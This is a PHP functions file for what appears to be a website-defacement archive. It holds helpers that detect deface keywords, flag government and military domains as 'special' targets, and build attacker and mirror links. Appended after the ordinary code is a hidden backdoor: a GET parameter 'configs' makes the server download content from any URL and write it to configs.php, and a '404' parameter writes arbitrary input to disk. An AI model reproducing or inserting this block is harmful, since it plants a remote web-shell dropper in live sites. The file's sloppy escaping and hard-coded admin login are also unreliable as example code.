<?php 
ob_start();
// Function Beritaz
function readmoreberita($string,$id){ 
    
    if(strlen($string) > 250){
        $pecah = substr($string, 0, 300); 
        $string = $pecah . "<br/><div class='pull-right'><a href='news.php?id=".$id."' class='btn btn-primary'>Read More</a></div>";
    } else {
        $string;
    }
    return $string; 
    
}


// Function Check Content
function cek_konten($teks) {
	$sec = StrToLower($_POST['hacker']);
    $penting = array("$sec", "Accept By zone-db","Struk","Hacked","H4cked","H4ck3d","Hack3d","Owned","0wnerd"."Ownerd","0wned","HaCKeD",".jpg","png.",".gif","by","By","BY","Mr","bY","inject","inj3ted","Own3d","0wn3d","Pwn3d","Tusboled","Tusb0led","Fucked","Fuck3d","Testing","Stamped","St4mped","Laughed","Laugh3d","Greetz","Gr33tz","Shoot","Shootz","Sh00t","Zone-H","Lulz","./");
    $hasil = 1;
    $jml_kata = count($penting);
    
    for ($i=0;$i<$jml_kata;$i++){
        if (stristr($teks,$penting[$i])){ 
            $hasil=0; }
 
        }
    return $hasil;
 }
 
// Cek Special Pada Action
function cek_special ($dat) {
	$domain = array (".go", ".gov", ".gob", ".an", ".edu", ".mil" , ".gouv");
	$special = 1; 
	$jumlah = count($domain);
	
	    for ($i=0;$i<$jumlah;$i++){
        if (stristr($dat,$domain[$i])){ 
            $special=0; }
		}
		return $special;
} 


// Function Filter URL & Domain 
function cek_url ($xss) {
	$block = array ("/~", "marquee", "HACKED%20by%20", "Hacked_by_", "Hacked by", "hacked_by", "51N1CH1", "<marquee>", "black7", "236.co.kr", "abeaddict.com", "ondostate.gov.ng");
	$result_block = 0; 
	$result = count($block);
	
	    for ($i=0;$i<$result;$i++){
        if (stristr($xss,$block[$i])){ 
            $result_block=1; }
		}
		return $result_block;
} 

//// Function Memendekan Link
function cutUrl($url){ 
    if(strstr($url, https)){
		$pecah = substr($url, 8, 21); 
        $url = $pecah . "...";
	} else if(strstr($url, http)){
        $pecah = substr($url, 7, 20); 
        $url = $pecah . "...";
    } else {
        $url;
    }
    return $url;
}

		
function cutServer($server){ 
    
    if(strlen($server) > 12){
        $pecah = substr($server, 0, 9); 
        $server = $pecah;
    } else {
        $server;
    }
    return $server;
}

function cekMass($mass,$ip){
    if($mass == '1'){
        echo "<a href='/mass/$ip/1.txt'>M</a>";;
    } else {
        echo '';
    }
}

function cekRedeface($redeface){
    if($redeface == '1'){
        echo "R";;
    } else {
        echo '';
    }
}


function cekSpecial($type){
    if($type == '1'){
        echo '<img src="/assets/img/star.png" style="width:12px;height:12px;" alt="Special Deface">';
    } else{
        echo '';
    }
}

function cekFlag($code,$name){
    if($code == ''){
        echo "<img src='/assets/img/SE.png' alt='Unknown' style='width:15px;'>";
    } else{
        echo "<img src='/assets/flags/$code.png' alt='$name' style='width:20px;'>";
    }
}

function cekHome($home){
    if($home == '1'){
        echo 'H';
    } else{
        echo '';
    }
}

function cekDefacer($nilai){
    if($nilai == 'No Attacker'){
        echo 'No Attacker';
    } else{
        echo "<a href='/attacker/total/$nilai/1.txt'>$nilai</a>";
    }
}

function cekTeam($nilai){
    if($nilai == 'No Team'){
        echo 'No Team';
    } else{
               echo "<a href='/team/total/$nilai/1.txt'>$nilai</a>";
    }
}


function cekMirror($nilai){
        echo "<a href='/mirror/id/$nilai'>Mirror</a>";
}

// Filter 404, 403
function cek_akses ($cuk) {
	$akses = array ("404 Not Found", "403 Forbidden", "could not be found", "Not Found", "Object not found!", "Error 404", "Server not found");
	$result_akses = 0; 
	$result = count($akses);
	
	    for ($i=0;$i<$result;$i++){
        if (stristr($cuk,$akses[$i])){ 
            $result_akses=1; }
		}
		return $result_akses;
}
// SQLi
function explodedNoSqli($data){
  $filter_sql = mysql_real_escape_string(stripslashes(strip_tags(htmlspecialchars(trim($data, ENT_QUOTES)))));
  return $filter_sql;
}

function explodedAlert($alert){
    echo"<script>alert('".$alert."');</script>";
}

function explodedDataAda($data){
    if(isset($data)){
        echo $data;
    }
}
function explodedKhususAdmin()
{
    if(!isset($_SESSION['exploded']['AUTH_ADMIN_LOGGED']))
    {
        explodedTambahPesan('Get Out Noobs :p');
        explodedRedirect('index.php');
    }
}

function explodedIsAdminLogin()
{
    return isset($_SESSION['exploded']['AUTH_ADMIN_LOGGED']);
	explodedTambahPesan('Login Coeg :v Sukses');
}
function explodedAdminLogout()
{
    unset($_SESSION['exploded']['AUTH_ADMIN_LOGGED']);
    explodedTambahPesan(':v Ente Sukses Logout Coeg');
}

function explodedRedirect($url = '')
{
    header('Location: '.$url);
    exit();
}

function explodedBuildUrl()
{
    return $_SERVER['PHP_SELF'].(isset($_SERVER['QUERY_STRING'])&&!empty($_SERVER['QUERY_STRING'])?'?'.$_SERVER['QUERY_STRING']:'');
}

function explodedTambahPesan($msg = '')
{
    $_SESSION['exploded']['PSN'] = !isset($_SESSION['exploded']['PSN']) ? $msg : $msg.'<br/>'.$_SESSION['exploded']['PSN'];
}

function explodedTampilPesan($return_string = false)
{
    if(isset($_SESSION['exploded']['PSN']))
    {
        $msg = trim($_SESSION['exploded']['PSN']);
        unset($_SESSION['exploded']['PSN']);
        
        if($return_string)
            echo '<div class="alert alert-success alert-dismissable">
                    '.$msg.'
                    
                  </div>';
        else
            echo '<div class="alert alert-success alert-dismissable">
                  '.$msg.'
                    
                  </div>';
    }
}
function explodedCobaLogin($uname = '', $pass = '')
{
    if($uname == exploded_admin_uname && $pass == exploded_admin_password)
    {
        $_SESSION['exploded']['AUTH_ADMIN_LOGGED'] = true;
        explodedRedirect('admin.php');
    }
    
    return false;
}

function get_curl_remote_ips($fp) {
    rewind($fp);
    $str = fread($fp, 8192);
    $regex = '/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/';
    if (preg_match_all($regex, $str, $matches)) {
        return array_unique($matches[0]);  // Array([0] => 74.125.45.100 [2] => 208.69.36.231)
    } else {
        return false;
    }
}
?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>